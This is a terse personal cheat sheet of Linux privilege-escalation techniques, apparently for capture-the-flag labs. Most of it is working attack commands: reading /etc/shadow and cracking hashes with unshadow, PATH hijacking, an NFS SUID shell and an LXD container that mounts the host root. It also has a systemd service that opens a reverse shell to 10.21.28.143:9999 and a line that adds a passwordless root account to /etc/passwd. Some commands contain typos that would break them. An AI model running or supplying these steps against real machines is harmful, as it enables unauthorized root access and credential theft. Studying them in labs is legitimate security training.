# ... LINUX ...

 ## hostname 

   * in some cases, it can provide information about the target system’s role within the corporate network

 ## uname -a  	 

  * This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

 ## /proc/version

   * The proc filesystem (procfs) provides information about the target system processes.Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

 ## /etc/issue

   * Systems can also be identified by looking at the /etc/issue file. 

 ## ps  & ps -A & ps axjf
 
   * The ps command is an effective way to see the running processes on a Linux system. 	

 ## ss for open port

   * ss -anp

 ## env 
  
   * The env command will show environmental variables.   

 ## sudo -l
    
   * The sudo -l command can be used to list all commands your user can run using sudo.

 ## /etc/passwd
     
   * Reading the /etc/passwd file can be an easy way to discover users on the system.
       ```cat /etc/passwd | cut -d ":" -f 1```
       ```cat /etc/passwd | grep home```

 ## netstat 
  
   * 	netstat -a: shows all listening ports and established connections.
		netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
		netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections.
		 This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
		netstat -s:list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.

 ## find

   *   __find / -perm -u=s -type f 2>/dev/null__  : find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 

 ## cat /etc/shadow 

   * This file stores the encrypted password hashes for user accounts on the system.  

 ## Debian GLIBC
 
   * ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
   
  ========================================================================================================

 ## Automation..

   * LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
    LinEnum: https://github.com/rebootuser/LinEnum
    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
    Linux Priv Checker: https://github.com/linted/linuxprivchecker   
  
 ## 1. Privilege Escalation: Kernel Exploits

   * Linux Kernel CVEs https://www.linuxkernelcves.com/cves     

     * use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).  

 =========================================================================================================
 ## 2. Privilege Escalation: SUID

   * __find / -type f -perm -04000 -ls 2>/dev/null__

       *  will list files that have SUID or SGID bits set.

 ## base64

   * base64 /etc/passwd | base64 --decode
   * base64 /etc/shadow | base64 --decode
   * unshadow passwd.txt shadow.txt > passwords.txt
   * /home/ubuntu/flag3.txt | base64 --decode

 ==========================================================================================================
 
 ## 3. Privilege Escalation: Capabilities

   * getcap

   - getcap -r / 2>/dev/null
 ==========================================================================================================

 ## 4. Privilege Escalation: Cron Jobs

 * cat /etc/crontab

 ==========================================================================================================

 ## 5. Privilege Escalation PATH

 * folder you have write access for.

 * echo cat /home/matt/flag6.txt" > thm

 * export PATH=/home/murdoch:$PATH

 $%$%$%$%$%$%$%$%$%$%$%$%$%$%$%$$%$%$%$%$% 

 * @see groub bu ```id```

 * now in this instance we created a new ```cat``` file in /tmp that when ran would spawn a shell.

 > cd /tmp$

  echo "/bin/sh" > cat

  chmod +x cat

  export PATH=/tmp:$PATH

  echo $PATH

  run bugtracker


 ==========================================================================================================

 ## 6. Privilege Escalation NFS (Network File Sharing) 

 * ```cat  /etc/exports``` :: The critical element for this privilege escalation vector is the “no_root_squash”.

 * mkdir /tmp/sharedfolder

 * sudo mount -o rw 10.10.114.12:/home/ubuntu/sharedfolder /tmp/sharedfolder

 * nana nfs.c === root_int_shell.c

 * cd /tmp/sharedfolder
 
 * gcc nfs.c -o nfs -w

 * chmod +s nfs

 * ./nfs

 ==========================================================================================================

 ## 7. Privilege Escalation Lxd/lxc

 *  git clone https://github.com/saghul/lxd-alpine-builder

 * cd lxd-alpine-builder

 * then fire a server

 * lxd init // victem machine //enter for all//
 
 * lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias privesc

 * lxc image list //to check

 * lxc init privesc preivesc-container -c security.priviledged=true

 * lxc list   |STOPPED 

 * lxc config device add privec-container mydevice disk source=/ path=/mnt/root recursive=true

 * lxc start privesc-container

 * lxc list

 * lxc exec privesc-container /bin/sh 

 ~# root

 ========================================================================================================== 

 ##  8. Privilege Escalation metasploit [Meterpreter.]

   * ps

   * migrate $servace_number$

   *  - search local exploit suggester __$%Don't Forget target id same arch {x86--x64}%$__


 ========================================================================================================== 

 ##  9. Privilege Escalation systemctl

   * __find / -user root -perm -4000 -print 2>/dev/null__


   * make file root.service

      [Unit]
      Description=roooooooooot

      [Service]
      Type=simple
      User=root
      ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.21.28.143/9999 0>&1'

      [Install]
      WantedBy=multi-user.target


   * /bin/systemctl enable /tmp/root.service 

   * /bin/systemctl start root   

 ========================================================================================================== 
 ## 10. Privilege Escalation file give you a permations
  
   * ln -s /etc/passwd /home/larissa/test
   * sudo /home/larissa/vic.sh larissa rw /home/larissa/test
   * echo "root3::0:0:root3:/root:/bin/bash" >> ./test
   * su root3
   
 ==========================================================================================================   
 
 - linPEAS  https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh


 ========================================================================================================== 
   
  * find / -type f -name "configurations.php" -exec ls -al {} \; 2>/dev/null 